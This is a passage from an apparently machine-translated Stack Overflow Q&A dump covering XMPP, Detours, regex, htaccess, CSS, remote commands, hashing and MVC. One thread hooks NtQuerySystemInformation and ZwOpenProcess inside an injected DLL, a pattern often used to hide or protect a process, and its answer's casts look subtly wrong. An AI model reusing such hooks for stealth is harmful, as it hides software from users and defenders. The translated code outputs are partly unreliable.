- (void)xmppStream:(XMPPStream *)sender didSendMessage:(XMPPMessage *)message
{  
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);
}

- (void)xmppStream:(XMPPStream *)sender didReceivePresence:(XMPPPresence *)presence
{
    DDLogVerbose(@"%@: %@ - %@", THIS_FILE, THIS_METHOD, [presence fromStr]);
}

- (void)xmppStream:(XMPPStream *)sender didReceiveError:(id)error
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);
}

- (void)xmppStreamDidDisconnect:(XMPPStream *)sender withError:(NSError *)error
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    if (!isXmppConnected)
    {
        DDLogError(@"Unable to connect to server. Check xmppStream.hostName");
    }
}

#pragma mark XMPPRosterDelegate

- (void)xmppRoster:(XMPPRoster *)sender didReceiveBuddyRequest:(XMPPPresence *)presence
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    XMPPUserCoreDataStorageObject *user = [xmppRosterStorage userForJID:[presence from]
                                                         xmppStream:xmppStream
                                               managedObjectContext:[self managedObjectContext_roster]];

    NSString *displayName = [user displayName];
    NSString *jidStrBare = [presence fromStr];
    NSString *body = nil;

    if (![displayName isEqualToString:jidStrBare])
    {
        body = [NSString stringWithFormat:@"Buddy request from %@ <%@>", displayName, jidStrBare];
    }
    else
    {
        body = [NSString stringWithFormat:@"Buddy request from %@", displayName];
    }

    if ([[UIApplication sharedApplication] applicationState] == UIApplicationStateActive)
    {
        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:displayName
                                                        message:body 
                                                       delegate:nil 
                                              cancelButtonTitle:@"Not implemented"
                                              otherButtonTitles:nil];
        [alertView show];
    } 
    else 
    {
        // We are not active, so use a local notification instead
        UILocalNotification *localNotification = [[UILocalNotification alloc] init];
        localNotification.alertAction = @"Not implemented";
        localNotification.alertBody = body;

        [[UIApplication sharedApplication] presentLocalNotificationNow:localNotification];
    }
}

-(void)sendingMessage
{       
    NSXMLElement *body = [NSXMLElement elementWithName:@"body"];
    [body setStringValue:@"Hello brother"];

    NSXMLElement *message = [NSXMLElement elementWithName:@"message"];
    [message addAttributeWithName:@"type" stringValue:@"chat"];
    [message addAttributeWithName:@"to" stringValue:@"abc.codemen@gmail.com"];
    [message addChild:body];

    [self.xmppStream sendElement:message];

    NSLog(@"message sending! : %@",message);
}

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:12:36.473

如果您是 xmpp 框架的新手，那么您应该首先为聊天客户端设置服务器（如 Ejabbered、openfire），然后您必须为聊天配置它。您将从以下链接中找到非常好的教程，该链接分为四个部分。请逐步查看本教程：-

[http://mobile.tutsplus.com/tutorials/iphone/building-a-jabber-client-for-ios-server-setup/](http://mobile.tutsplus.com/tutorials/iphone/building-a-jabber-client-for-ios-server-setup/)

# c++ - C++ Detours 3.0 express on MVS 2012 错误“找不到标识符”

> ID：16013559
> 
> 赞同：2
> 
> 时间：2013-04-15T11:03:59.920
> 
> 标签：c++, detours

我的编译器：Microsoft Visual Studio 2012。
我的代码在 detours 2.1 上可以正常工作，但我无法再用我的编译器编译它（模块对 SAFESEH 图像不安全。）。我需要使用像 MVS2005 这样的旧编译器，但我不想这样做。

所以我需要更新我的代码并使用 detours 3.0。

编辑了一些东西，得到了 4 个错误。

```
error C3861: 'DetourFunction': identifier not found
error C3861: 'DetourFunction': identifier not found
error C3861: 'DetourRemove': identifier not found
error C3861: 'DetourRemove': identifier not found 
```

这是代码块：

DetourFunction 错误在这里

```
o_NtQuerySystemInformation = (t_NtQuerySystemInformation)DetourFunction((PBYTE)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation"), (PBYTE)My_NtQuerySystemInformation);
o_ZwOpenProcess = (t_ZwOpenProcess)DetourFunction((PBYTE)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwOpenProcess"), (PBYTE)My_ZwOpenProcess); 
```

DetourRemove 此处的错误

```
 DetourRemove((PBYTE)o_NtQuerySystemInformation, (PBYTE)My_NtQuerySystemInformation);
    DetourRemove((PBYTE)o_ZwOpenProcess, (PBYTE)My_ZwOpenProcess); 
```

* * *

*更新*

因此，我尝试将其更改为 DetourAttach 和 DetourDetach，但出现 PBYTE to PVOID 错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-16T09:04:48.947

`DetourFunction`并`DetourRemove`已替换为`DetourAttach`和`DetourDetach`。使用它们并不难，并且该库附带了一组示例，您可以在其中了解如何使用这些 API。您的代码应如下所示：

```
BOOL APIENTRY DllMain( HANDLE hModule, 
                      DWORD  ul_reason_for_call, 
                      LPVOID lpReserved
                      )
{
   if (ul_reason_for_call == DLL_PROCESS_ATTACH)
   {
      o_NtQuerySystemInformation = (t_NtQuerySystemInformation)DetourAttach(&(PVOID&)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation"), My_NtQuerySystemInformation);
      o_ZwOpenProcess = (t_ZwOpenProcess)DetourAttach(&(PVOID&)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwOpenProcess"), My_ZwOpenProcess);

      MyModuleHandle = (HMODULE)hModule;
      MyPid = GetCurrentProcessId();
   }
   if (ul_reason_for_call == DLL_PROCESS_DETACH)
   {
      DetourDetach(&(PVOID&)o_NtQuerySystemInformation, My_NtQuerySystemInformation);
      DetourDetach(&(PVOID&)o_ZwOpenProcess, My_ZwOpenProcess);
   }

   return TRUE;
} 
```

# java - 删除两个字符之间的字符串

> ID：16013560
> 
> 赞同：-1
> 
> 时间：2013-04-15T11:04:00.480
> 
> 标签：java, android, regex

我在尝试从字符串文件中删除单词时遇到问题，例如：

```
 String text = "data['danger.high'] && data['$safe.low'] || data['go.now']"; 
```

我想做的是从字符串中删除第一个单引号和“。”之间的所有内容。，我想要的结果如下：

```
 result = "data[high] && data[low] || data[now]"; 
```

这将是我需要的结果。

到目前为止我得到的是

```
 String text = "data['danger.high'] && data['$safe.low'] || data['go.now']";
    text = text.replaceAll("\\'(.*?)\\.", ""); 
```

但这给了我

```
 result = "data[highlownow']" 
```

我究竟做错了什么？

**更新**

感谢您的回答，现在我的后续问题可以说我有

```
 String text = "data['danger.high'] && (data['$safe.low'] || data['go.now'] == 'yes')"; 
```

我想要以下结果：

```
 result = "data[high] && (data[low] || data[now] == 'yes')"; 
```

在这种情况下保持单引号为“是”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:09:36.200

你可以这样做：

```
text = text.replaceAll("\\'([$a-zA-Z]+)\\.", "'").replaceAll("'", ""); 
```

`text.replaceAll("\\'([$a-zA-Z]+)\\.", "'")`会给你：

```
 data['high'] && data['low'] || data['now'] 
```

并且`.replaceAll("'", "");`会给你想要的结果（没有`'`）。

```
data[high] && data[low] || data[now] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:08:43.670

你的正则表达式应该稍微调整一下。寻找`$`字符和`[a-zA-Z]`. 我假设您想保留单引号。如果不需要，请告诉我。您也可以`replaceAll()`再次使用字符串来删除单引号。

```
 String text = "data['danger.high'] && data['$safe.low'] || data['go.now']";
        text = text.replaceAll("\\'([$a-zA-Z]+)\\.", "'");
        System.out.println(text); 
```

输出

> 数据['高'] && 数据['低'] || 数据['现在']

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:13:26.803

您的表达式正在删除从第二个单引号开始的字符，这就是您要获得此结果的原因您应该防止 replaceAll 以 '] 开头的字符

使用 text = text.replaceAll("\'([$a-zA-Z]+)\.", "'");

# .htaccess - htaccess 为分页 url 重写正则表达式

> ID：16013561
> 
> 赞同：0
> 
> 时间：2013-04-15T11:04:00.093
> 
> 标签：.htaccess

我需要一个表达式，它将以 -0.htm 结尾的旧 url 模式重写（实际上是 301 重定向）到新的 -1.htm

所以如果旧 url 是`/path/to/pagination/script-0.htm`
新 url 必须是`/path/to/pagination/script-1.htm`
这必须适用于任意数量的文件夹/子文件夹结构。
并且必须仅适用于 [ `-0.htm`]。仅适用于以此模式结尾的网址。

关于如何实现这一点的任何想法？
我的 htaccess 正则表达式知识仅限于没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:06:48.330

您可以尝试以下方法：

```
RewriteRule ^(.*?)\-0\.htm$ $1-1.htm [R=301,L] 
```

但要确保它是第一条规则之一，在那些可能会通过真实文件的规则之前。

# css - CSS 定位，在流体布局中覆盖 div

> ID：16013566
> 
> 赞同：0
> 
> 时间：2013-04-15T11:04:25.893
> 
> 标签：css, fluid-layout, css-position

这是我第一次设计流畅的布局，我想做的一件事是在照片底部添加标题。我正在使用的方法是将照片（宽度：100%）放在一个 div（宽度：50%）内，并在照片下添加一个包含标题的 div。为了让它覆盖，我将标题的高度设置为静态 30px 并将位置设置为相对和顶部 -50px（+填充）。

**CSS：**

```
#contentdiv {
    width:50%;
}
#gallerydescription {
    height:30px;
    padding:10px;
    background-image:url(../contentbkg.png);
    position:relative;
    top:-50px;
    margin-bottom:-50px;
} 
```

**HTML：**

```
<div id="contentdiv">
   <img src="blog/1.gif" width="100%" />
   <div id="gallerydescription">
      Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed dictum urna nec urna varius varius.
   </div>
</div> 
```

这在视觉上符合我的要求，但它并不是真正的流畅布局，如果标题太短或太短，它看起来很难看。有没有一种方法可以让标题的长度来确定标题 div 的高度，并使“顶部”成为高度和填充的负数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:16:37.303

试试这个，看看它的样子：

```
#contentdiv {
    width:50%;
    position: relative
}
#gallerydescription {
    height:30px;
    padding:10px;
    background-image:url(../contentbkg.png);
    position:absolute;
    left: 0; right: 0; bottom: 0;
    z-index: 5;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:17:06.460

纯 CSS 解决方案，解决您遇到*的*问题

## CSS

```
 #contentdiv{
        width: 50%;
        position: relative;
     }
     #gallerydescription{
        padding: 10px;
        background-image: url('../contentbkg.png');
        box-sizing: border-box;
        -moz-box-sizing: border-box;
        position: absolute;
        bottom: 0;
        width: 100%;
        max-height: 60%;
        overflow: hidden;
     } 
```

## 标记（未更改）

```
 <div id="contentdiv">
     <img src="blog/1.gif" width="100%" />
     <div id="gallerydescription">
        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed dictum urna nec urna varius varius.
     </div>
  </div> 
```

## 更新

[jsfiddle](http://jsfiddle.net/Gz5R4/)试试这个小提琴

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-15T11:12:08.410

为此，您可以尝试使用[jQuery UI Position](http://jqueryui.com/position/)。

它允许相对定位两个元素，例如

```
$("#elementToPosition").position({
  my: "left top",
  at: "right bottom",
  of: "#targetElement"
}); 
```

然后更改 top 属性以进行覆盖：

```
$("#elementToPosition").css('top',$("#elementToPosition").css('top') - 10px); 
```

# python - 远程 MS Windows 主机上的 Python 子进程

> ID：16013574
> 
> 赞同：1
> 
> 时间：2013-04-15T11:04:49.793
> 
> 标签：python, windows, subprocess, remote-access

我正在尝试在远程 Windows 主机（具有管理员权限的 Windows 域环境）上运行 netsh 命令。以下代码在本地主机上运行良好，但我想在远程主机上运行它以及使用 python。

```
import subprocess

netshcmd=subprocess.Popen('netsh advfirewall show rule name=\”all\”', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE )
output, errors =  netshcmd.communicate() 
```

问题是我不确定如何/使用什么方法来启动与远程主机的连接，然后运行子进程命令。我不能使用 ssh 或 pstools，如果可能的话，我想尝试使用现有的 pywin32 模块来实现它。

我过去使用过 WMI 模块，这使得查询远程主机变得非常容易，但我找不到任何通过 WMI 查询防火墙策略的方法，这就是使用子进程的原因。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:23:35.167

首先，您使用 pxssh 模块 Python 登录远程主机 [：How can remote from my local pc to remoteA to remoteb to remote c using Paramiko](https://stackoverflow.com/questions/15818328/python-how-can-remote-from-my-local-pc-to-remotea-to-remoteb-to-remote-c-using/15831027#15831027)

windows远程登录：

```
child = pexpect.spawn('ssh tiger@172.16.0.190 -p 8888')
child.logfile = open("/tmp/mylog", "w")
print child.before
child.expect('.*Are you sure you want to continue connecting (yes/no)?')
child.sendline("yes")

child.expect(".*assword:")
child.sendline("tiger\r")
child.expect('Press any key to continue...')
child.send('\r')
child.expect('C:\Users\.*>')
child.sendline('dir')
child.prompt('C:\Users\.*>') 
```

[Python - Pxssh - 尝试登录远程服务器时出现密码被拒绝错误](https://stackoverflow.com/questions/15823011/python-pxssh-getting-an-password-refused-error-when-trying-to-login-to-a-rem/15831372#15831372)

并发送您的 netsh 命令

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-20T08:25:33.723

我会推荐使用***[Fabric](http://www.fabfile.org/)***，它是一个强大的 python 工具，具有一套用于执行本地或远程 shell 命令的操作，以及诸如提示正在运行的用户输入或中止执行等辅助功能：

1.  安装面料： `pip install fabric`
2.  编写以下名为**remote_cmd.py**的脚本：

```
"""
Usage:
    python remote_cmd.py ip_address username password your_command
"""

from sys import argv
from fabric.api import run, env

def set_host_config(ip, user, password):
    env.host_string = ip
    env.user = user
    env.password = password

def cmd(your_command):
    """
    executes command remotely
    """
    output = run(your_command)
    return output

def main():
    set_host_config(argv[1], argv[2], argv[3])
    cmd(argv[4]))

if __name__ == '__main__':
    main() 
```

**用法：**

```
python remote_cmd.py ip_address username password command 
```

# php - 表格行前的锚点

> ID：16013575
> 
> 赞同：0
> 
> 时间：2013-04-15T11:04:50.137
> 
> 标签：php, html

我在*PHP*中动态生成我的代码，并将**ID**属性从数据库添加到锚 href。它看起来像这样：

**PHP**

```
<table>
<tr><th>ID</th></tr>
<?php
if ($stmt = $mysqli->prepare("SELECT id FROM table;")) {

    $stmt->execute();                   
    $stmt->bind_result($id);

    while ($stmt->fetch()) {
        echo '<a href="somepage.php?id='.$id.'"><tr>...</tr></a>'
    }

    .... //closing the statment + error
?>
</table> 
```

生成了这个**HTML**：

```
<a href="somepage.php?id=1></a>
<a href="somepage.php?id=2></a>
<a href="somepage.php?id=3></a>
<a href="somepage.php?id=4></a>
....
<tr>....</tr>
<tr>....</tr>
<tr>....</tr>
<tr>....</tr>
.... 
```

为什么`<tr>...</tr>`里面没有`<a>`没有，为什么不能点击？

我尝试为`<a>`(`display,width,height` ) 添加一些样式，但没有运气。

如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:06:09.300

将链接设置为表格行中的 ID，例如：

```
<table>
    <tr id='http://www.google.com/'>
        <td>foo</td>
        <td>bar</td>
    </tr>
    <tr id='http://www.stackoverflow.com/'>
        <td>foo</td>
        <td>bar</td>
    </tr>
</table> 
```

使用这个小 jquery 脚本来检测点击的行/链接

```
$('tr').click(function () {
   var id = $(this).attr('id');
   alert(id);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:13:57.150

`tr`有内线的标记`a`是无效的，所有的赌注都是关闭的。尽管您可以使用 JavaScript 将处理程序与其关联，但您不能在 HTML 中创建`tr`这样的链接。`onclick`在纯 HTML 中，您必须将每个单元格的内容分别设为链接，`<td><a href=...>...</a></td>`.

# testing - 如何使用 JMeter 对 Websocket 进行负载测试？

> ID：16013577
> 
> 赞同：-2
> 
> 时间：2013-04-15T11:05:07.187
> 
> 标签：testing, websocket, jmeter, load-testing, jmeter-plugins

如何将 jmeter 与 Jetty WebSockets 一起使用？
我的意思是我可以使用 jmeter 对 websockets 执行负载测试吗？
除了 jmeter 之外，还有其他工具可以对码头 Web 套接字执行负载测试吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-16T21:04:46.120

这是支持 RFC6455 版本的 WebSocket 的 JMeter 的替代 WebSocket 插件。

希望它有用：http: [//github.com/maciejzaleski/JMeter](http://github.com/maciejzaleski/JMeter)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:39:24.170

看起来你至少可以试试这个：[jmeter-websocket](https://github.com/kawasima/jmeter-websocket) - WebSocket 协议的 jmeter 插件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-07T13:17:12.887

有一个替代工具专门用于对 websocket 进行负载测试。它被命名为[雷神](https://github.com/observing/thor)。

感谢开发人员使其变得简单、轻量和开源。

**编辑：**

托尔似乎有点过时了。有个巨人叫[加特林](http://gatling.io/)。他们有一个强大且高度可定制的引擎。你必须用 Scala 编写一些基本的代码才能让这个东西正常工作。但这确实很容易，而且他们的[文档](http://gatling.io/docs/2.2/http/websocket/)也很简单。

也有论坛寻求帮助。

# android - 如何检测android应用程序是否被强制停止或卸载？

> ID：16013578
> 
> 赞同：15
> 
> 时间：2013-04-15T11:05:08.130
> 
> 标签：android

假设应用程序运行良好但用户强行停止或卸载它，如何检测？有没有办法做到这一点？编写另一个应用程序定期检查系统中是否存在旧应用程序是否是一种好习惯？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-15T11:09:17.010

抱歉，无法在 Android 上检测到这一点。

当用户或系统强制停止您的应用程序时，整个进程就会被简单地杀死。没有回调通知您这已经发生。

当用户卸载应用程序时，首先该进程被终止，然后您的 apk 文件和数据目录被删除，以及包管理器中的记录，这些记录告诉其他应用程序您注册了哪些意图过滤器。

# c++ - 如何在 gtkmm 中删除自定义 TreeModel 中的 user_data？

> ID：16013579
> 
> 赞同：1
> 
> 时间：2013-04-15T11:05:09.187
> 
> 标签：c++, gtkmm, gtk3

我创建 user_data 是这样的：

```
bool
MyTreeModel::iter_nth_root_child_vfunc (int index, iterator & iter) const
{
   iter .gobj () -> user_data = new UserData (...);
   return true;
} 
```

我可以创建用户数据，但是有没有办法在迭代器被销毁时得到通知，所以我可以删除我的用户数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:34:40.200

不; `user_data`是一个非拥有指针。您应该将树与基于节点的容器（例如`std::map`）并行并将`UserData`对象存储在其中，`user_data`指针指向容器。

# xaml - 在文本框中放置图像

> ID：16013580
> 
> 赞同：0
> 
> 时间：2013-04-15T11:05:11.720
> 
> 标签：xaml

如何将图像放置在 XAML TEXTBOX 中？我正在寻找一个控件，我可以在它旁边放置一个图像和一个文本，并且它必须是可滚动的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:13:37.997

使用[RichTextBox](http://msdn.microsoft.com/en-us/library/system.windows.controls.richtextbox.aspx)。它提供了显示文本和图像的功能。

# c++ - C++中字符串的哈希表

> ID：16013581
> 
> 赞同：5
> 
> 时间：2013-04-15T11:05:14.367
> 
> 标签：c++, hashmap, hashtable

我过去做过一个关于哈希表的小练习，但是用户给出了数组大小，结构也是这样的（所以用户每次都给出一个数字和一个单词作为输入）

```
struct data
{
   int key;
   char c[20];
}; 
```

所以这很简单，因为我知道数组大小，而且用户说他将提供多少项作为输入。我这样做的方式是

*   散列用户给我的密钥
*   在数组中找到位置数组[hashed(key)]
*   如果它是空的，我会把数据放在那里
*   如果不是，我会把它放在我能找到的下一个空闲位置。

但现在我必须制作倒排索引并且我正在重新搜索，以便我可以为它制作一个哈希表。所以单词将从大约 30 个 txt 中收集，它们会非常多。那么在这种情况下，数组应该有多长？我怎样才能散列单词？我应该使用带有开放寻址或链接的hasing。练习说如果我们在网上找到它，我们可以使用哈希表。但我更喜欢自己理解和创造它。任何线索都会帮助我:)

在这个练习（使用哈希表的倒排索引）中，结构看起来像这样。数据类型是我将创建的哈希表的类型。

```
struct posting
{
    string word;
    posting *next
}

struct data
{
    string word;
    posting *ptrpostings;
    data *next
}; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T13:44:20.897

散列可以按照您的选择进行。假设字符串是 ABC。您可以使用散列作为 A=1, B=2, C=3, Hash = 1+2+3/(length = 3) = 2。但是，这是非常原始的。

数组的大小将取决于您部署的散列算法，但最好选择为每个字符串返回确定长度散列的算法。例如，如果您选择使用 SHA1，您可以安全地为每个哈希分配 40 个字节。请参阅[在 MySQL 中存储 SHA1 哈希值](https://stackoverflow.com/questions/614476/storing-sha1-hash-values-in-mysql)阅读算法[http://en.wikipedia.org/wiki/SHA-1](http://en.wikipedia.org/wiki/SHA-1)。我相信它可以安全地使用。

另一方面，如果只是为了简单的练习，也可以使用 MD5 散列。我不建议在实际用途中使用它，因为它的彩虹表很容易获得:)

- - - - -编辑 - - - -

您可以尝试像这样实现::

```
#include <iostream>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#define MAX_LEN 30
using namespace std;

typedef struct
{
    string name; // for the filename
    ... change this to your specification
}hashd;

hashd hashArray[MAX_LEN]; // tentative

int returnHash(string s)
{
    // A simple hashing, no collision handled
    int sum=0,index=0;
    for(string::size_type i=0; i < s.length(); i++)
    {
        sum += s[i];
    }
    index = sum % MAX_LEN;
    return index;
}

int main()
{
    string fileName;
    int index;
    cout << "Enter filename        ::\t" ;
    cin >> fileName;
    cout << "Enter filename is     ::\t" + fileName << "\n";
    index = returnHash(fileName);
    cout << "Generated index is ::\t" << index << "\n";
    hashArray[index].name = fileName;
    cout << "Filename in array    ::\t" <<hashArray[index].name ;
    return 0;
} 
```

然后，要实现 O(1)，只要您想获取文件名的内容，只需运行 returnHash(filename) 函数。它将直接返回数组的索引:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T17:22:30.743

哈希表可以实现为简单的二维数组。问题是如何计算要存储的每个项目的唯一键。有些东西在数据中内置了键，而对于其他东西，您必须计算一个：上面建议的 MD5 可能正好满足您的需求。

您需要解决的下一个问题是如何布局或调整哈希表的大小。您最终需要通过一些测试来调整自己的需求。您可以从设置数组的第一个维度开始，其中包含 255 个条目——一个用于 MD5 哈希的前 2 位数字的每个组合。每当发生碰撞时，您都会在数组的第 2 维索引处的第 1 维索引处添加另一个条目。这意味着您将静态定义一维数组，同时根据需要动态分配二维条目。希望这对你和我一样有意义。

在进行查找时，您可以立即使用 MD5 哈希的第 2 位找到正确的第 1 维索引。然后沿着二维的相对短线性搜索将快速将您带到您寻找的项目。

您可能会从实验中发现，如果您的数据集足够大，使用更大的第一维（使用 MD5 哈希的前 3 位）会更有效。根据所涉及文本的大小以及它们对词典的使用分布，您的结果可能会决定您的一些架构。

另一方面，您可能只是从小处着手，并构建一些智能来自动调整表格的大小和布局。如果您的桌子在任一方向上都变得太长，性能就会受到影响。

# tcl - 从非交互式 shell 将执行时间参数传递给 TCL 脚本

> ID：16013584
> 
> 赞同：0
> 
> 时间：2013-04-15T11:05:22.890
> 
> 标签：tcl, interactive, jsch

我能够从 Windows 环境的 java 程序中使用的 JSch 库创建的非交互式 shell 在 linux 服务器上运行 TCL 脚本。问题是我有一些脚本需要在脚本执行期间根据脚本的中间输出传递某些参数，并且在输入参数后，脚本执行从那里继续。但由于它是非交互式外壳，我无法在执行期间传递此参数。有什么办法可以让它工作吗？我想到了一个选项，我将参数作为命令行参数传递，但想知道其他方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:20:33.367

当您说“参数”时，您是指用户在*交互式*会话中输入的任何内容作为脚本提供的*提示的输入吗？*

如果是的话，有两种可能：

*   如果脚本不希望会话是交互式的，并且只是从其标准输入流中读取其输入（`gets`例如使用），那么只需将此输入提供给`tclsh`解释您的脚本的进程的标准输入。
*   如果脚本确实希望会话是交互式的（并且拒绝只接受来自其输入流的数据），则您必须为目标进程分配一个伪 TTY。

    我不熟悉`JSch`，但这[似乎](https://stackoverflow.com/q/11968805/720999)是一个处理`JSch`分配 PTY 的问题（和答案）。

# c# - 使用 WebClient 将图像上传到 Web 服务

> ID：16013585
> 
> 赞同：0
> 
> 时间：2013-04-15T11:05:23.117
> 
> 标签：c#, web-services, webclient

使用上传图像到网络服务时遇到问题`web client`，我的代码是--->

```
Uri uri = new Uri("http://localhost/Test/SaveImage");
            string imageData = Convert.ToBase64String(data);
            WebClient web = new WebClient();
            web.UploadStringAsync(uri, "Post", imageData);
            web.UploadStringCompleted += new UploadStringCompletedEventHandler(web_UploadStringCompleted); 
```

在上面的代码中，图像转换为字节数组，然后到 Base64String 上传。

但在接收端--->

```
[HttpPost]
public bool SaveImage(string ImageBytes)   <---ImageBytes is Null
        {
                 ///// some code
        } 
```

**ImageBytes 参数为空**，任何人都可以找出问题所在吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:14:37.013

你曾经在哪里`data`与价值联系在一起`ImageBytes`？

作为替代方案，您是否尝试过使用`UploadValues`？参考在[这里](http://msdn.microsoft.com/en-us/library/ms144247.aspx)。

在你的情况下，它会是这样的：

```
var uri = new Uri("http://localhost/Test/SaveImage");
var nameValueCollection = new NameValueCollection();
nameValueCollection.Add("ImageBytes", Convert.ToBase64String(data));
WebClient web = new WebClient();
web.UploadValuesAsync(uri, "Post", nameValueCollection);
web.OnUploadValuesCompleted += ... 
```

# jquery - Jquery - 查找窗口宽度并将其放在隐藏字段中

> ID：16013591
> 
> 赞同：-6
> 
> 时间：2013-04-15T11:05:48.220
> 
> 标签：jquery, forms, window

是否可以找出浏览器的窗口宽度，然后将其作为隐藏字段中的值？

先感谢您。

更新：我知道我应该熟悉 jQuery - 这是我使用代码的方式吗？

```
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.6.1.min.js" >/script>
    <script type="text/javascript">
        var MyWindowwidth = $(window).width();
        $("#thew").val(MyWindowwidth);
    </script>
</head>
<body>
    <form id="form1" name="form1" method="get" action="">
        <input type="hidden" id="thew" name="thew" value="">
        <input type="submit" name="subm" id="subm" value="Submit" />
    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:07:06.193

```
$("#yourHiddenFieldId").val($(window).width()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:10:13.477

```
var MyWindowwidth = $(window).width();     // get Width 
$("#idOfMyHiddenField").val(MyWindowwidth); // Put width in your Hidden field with id :idOfMyHiddenField 
```

# php - 从下拉列表中删除多选选项

> ID：16013595
> 
> 赞同：0
> 
> 时间：2013-04-15T11:06:20.763
> 
> 标签：php, jquery

有谁知道如何`option`从表单下拉列表中删除多个 s？我想从数据库中读取数据，并根据它的值删除一些`option`s。

```
<select name="year">
    <option value="1">First year/option>
    <option value="2">Second year</option>
    <option value="3">Third year</option>
</select> 
```

从数据库中读取数据后，我想根据数据的值删除一些值。因此，如果数据值为`3`，我想从下拉列表中删除值`1`和..`2`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:10:47.443

您可以使用[filter()](http://api.jquery.com/filter/)根据自定义条件过滤掉元素。

**[现场演示](http://jsfiddle.net/rajaadil/QTw8X/)**

```
$('[name=year] option').filter(function(){
    return this.value != '3'
}).remove(); 
```

或者

**[现场演示](http://jsfiddle.net/rajaadil/QTw8X/1/)**

```
$('select :not(option[value=3])').remove(); 
```

**根据评论进行**编辑，***以过滤元素的值小于给定值。***

 **使用`<`运算符而不是 == then 并将值视为数字而不是字符串，

```
$('[name=year] option').filter(function(){
    return parseInt(this.value) < 3
}).remove(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:08:10.870

您所要做的就是拥有同一个下拉框的 2 个部分。在这些部分中，您需要动态生成省略不需要的选项的选项。

```
 if($data_from_db){
      <select name="year">
       <option value="1">First year/option>
       <option value="2">Second year</option>
      </select>
   }
   else{
     <select name="year">
       <option value="1">First year/option>
       <option value="2">Second year</option>
       <option value="3">Third year</option>
     </select>
   } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:10:12.027

你可以使用这样的东西

```
$("select option[value!='3']").remove(); 
```**

# c# - MVC 4 乐观并发异常

> ID：16013596
> 
> 赞同：0
> 
> 时间：2013-04-15T11:06:20.993
> 
> 标签：c#, ajax, asp.net-mvc, entity-framework, partial-views

遇到这个[问题](https://stackoverflow.com/questions/16011151/mvc-4-edit-modal-form-using-bootstrap/16011752?noredirect=1#comment22836840_16011752)（我想允许使用引导模式窗口进行编辑，我正在使用 MVC4 和实体框架），当我想保存我的更改时，我有这个错误消息，因为我正在使用模式窗口：

```
Store update, insert, or delete statement affected an unexpected number of rows (0). Entities may have been modified or deleted since entities were loaded. Refresh ObjectStateManager entries. 
```

这是我的行动：

```
[HttpGet]
        public ActionResult EditPerson(long id)
        {
            var person = db.Persons.Single(p => p.Id_Person == id);

            ViewBag.Id_ProductPackageCategory = new SelectList(db.ProductPackageCategories, "Id_ProductPackageCategory", "Name", person.Id_ProductPackageCategory);

            return PartialView("_EditPerson", person);
        }

        [HttpPost]
        public ActionResult EditPerson(Person person)
        {
            ViewBag.Id_ProductPackageCategory = new SelectList(db.ProductPackageCategories, "Id_ProductPackageCategory", "Name", person.Id_ProductPackageCategory);

            if (ModelState.IsValid)
            {
                ModelStateDictionary errorDictionary = Validator.isValid(person);

                if (errorDictionary.Count > 0)
                {
                    ModelState.Merge(errorDictionary);
                    return View(person);
                }

                db.Persons.Attach(person);
                db.ObjectStateManager.ChangeObjectState(person, EntityState.Modified);
                db.SaveChanges();
                return View("Index");
            }

            return View(person);
        } 
```

我的部分观点：

```
@model BuSIMaterial.Models.Person

<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
    <h3 id="myModalLabel">Edit</h3>
</div>
<div>

@using (Ajax.BeginForm("EditPerson", "Person", FormMethod.Post,
                    new AjaxOptions
                    {
                        InsertionMode = InsertionMode.Replace,
                        HttpMethod = "POST",
                        UpdateTargetId = "table"
                    }))
{

    @Html.ValidationSummary()
    @Html.AntiForgeryToken()

    <div class="modal-body">
       <div class="editor-label">
            First name :
        </div>
